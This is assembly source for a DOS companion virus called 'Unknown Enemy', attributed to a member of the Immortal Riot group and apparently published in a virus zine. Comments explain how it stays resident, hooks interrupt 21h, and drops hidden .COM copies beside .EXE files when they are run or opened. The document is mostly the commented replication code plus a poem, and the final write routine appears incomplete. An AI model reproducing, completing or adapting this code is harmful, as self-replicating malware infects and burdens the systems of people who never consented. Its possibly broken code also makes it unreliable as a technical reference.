; Virus name  : Unknown Enemy
; Virus author: Metal Militia
; Virus group : Immortal Riot
; Origin      : Sweden
;
; This is my very first companion/spawning creation. It uses a tsr int27
; routine to put itself in memory, and then when someone exec's or opens
; a file it'll create itself as a .COM of that file if it's an .EXE,
; else it'll drop out. It's pretty small, except for the text included.
; No encryption or destructive routines inside, just pure
; replicationing. Not even a simple priting routine or something,
; i'm just *too* nice! Well, urm!.. Enjoy Insane Reality issue #4!
;
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
;			  UNKNOWM ENEMY!
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

virus           segment
                org     100h
                assume  cs:virus, ds:virus, es:virus

start:          mov     ax,3521h                ; Hook interrupt 21
                int     21h
                mov     di,offset int21         ; Old int21
                mov     word ptr int21,bx       ; Put it here
                mov     word ptr int21+2,es
                mov     dx,offset infect        ; Offset "our" int21
                mov     ah,25h
                int     21h
                mov     dx,di                   ; Offset int21 (same as "di")
                int     27h                     ; TSR '27

infect:         cmp     ax,4b00h                ; Executing file
                je      sheesh                  ; If so, creat kompanion
                cmp     ax,3d00h                ; Open file
                je      sheesh
                jmp     interrupt               ; If not, exit
sheesh:
                jmp     move_on                 ; "Companion" it!

       db      'Unknown Enemy' ; Virus name
       db      '(c) Metal Militia/Immortal Riot'              ; Author
       db      'I''m hurt, machineguns firing behind my back' ; Poem
       db      'Never had no chance, no way to do a attack'
       db      'Thisone sure is the last time i guess'
       db      'Heading for a private deathrow, nothing less'
       db      'Blood, quickly pumping out from the vound in the vain'
       db      'Damn, this moment makes you sort of go insane'
       db      'Close my eyes, had much left to see'
       db      'Was my fault, but did they have to do it, gee?'
       db      'Promise me, this hit you will remember'
       db      'Take one of them down before winter comes in december'
       db      'Why that month? Well, i like it very much'
       db      'Fresh, cool air, wonders of the snow to touch'
       db      'The world is wonderful, what else to say?'
       db      'Just remember this shit, cause it happends every day'
	       ; ^^^ - Ohh! I'm impressed (The Unforgiven).

move_on:
                push    ax
                push    es
                push    ds                      ; Set ES to DS
                pop     es
                mov     di,dx                   ; Scan after extension
                mov     al,'.'
                repne   scasb
                push    di                      ; Point at extension
                mov     ax,'XE'                 ; Check if it's an .EXE
                stosw
                stosb
                pop     di
                pop     es
                pop     ax
                push    ax
                push    dx
                pushf
                push    cs
                call    interrupt
                mov     ax,'OC'                 ; Change
                stosw                           ; to
                mov     al,'M'                  ; .COM extension
                stosb
                pop     dx                      ; Clear the stack
                pop     ax
                jc      interrupt               ; No .EXE, quit this stuff
                mov     cx,2                    ; Read-only, Hidden attributes
                mov     ah,3ch                  ; Create .COM file
                int     21h
                xchg    bx,ax                   ; Mov ax,bx
                push    cs
                pop     ds
                mov     cx,offset int21-100h    ; Offset length
                mov     dx,si                   ; from start
                mov     ah,40h                  ; write virus

interrupt:
        db      0eah                            ; Jmp Far
int21:                                ; The interrupt storage/vir end.
			      
virus           ends
                end     start
